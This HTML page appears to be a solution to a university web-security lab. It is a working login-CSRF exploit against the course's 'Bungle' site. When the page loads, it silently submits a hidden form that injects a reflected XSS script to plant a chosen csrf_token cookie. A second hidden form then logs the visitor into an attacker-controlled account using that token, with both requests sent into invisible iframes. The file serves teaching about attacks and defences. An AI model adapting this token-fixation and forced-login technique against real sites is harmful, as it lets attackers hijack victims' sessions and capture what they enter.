<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
    </head>
    <body>
        <form action="http://bungle-cs461.cs.illinois.edu/search" method="GET" name="setToken" target ="a">

            <input type="hidden" name="q" value = "<script>document.cookie='csrf_token=8949018f3c69e33f70ca9538f5c5bf37';</script>">
        </form>
    
        
        <form action="http://bungle-cs461.cs.illinois.edu/login?csrfdefense=1&xssdefense=0" method="POST" name="attack" target ="b">
            <input type="hidden" name="csrf_token" value = "8949018f3c69e33f70ca9538f5c5bf37">
            <input type="hidden" name="username" value="attacker"/>
            <input type="hidden" name="password" value="l33th4x"/>
        </form>

     <iframe style="display:none;" name="a" id="frame_a"></iframe>
     <iframe style="display:none;" name="b" id="frame_b"></iframe>
    </body>
    <script type="text/javascript">
        window.onload=function(){
            document.setToken.submit();  // first set a token using search/ and XSS
            document.attack.submit();    // then login using the token just set
        }

    </script>
</html>
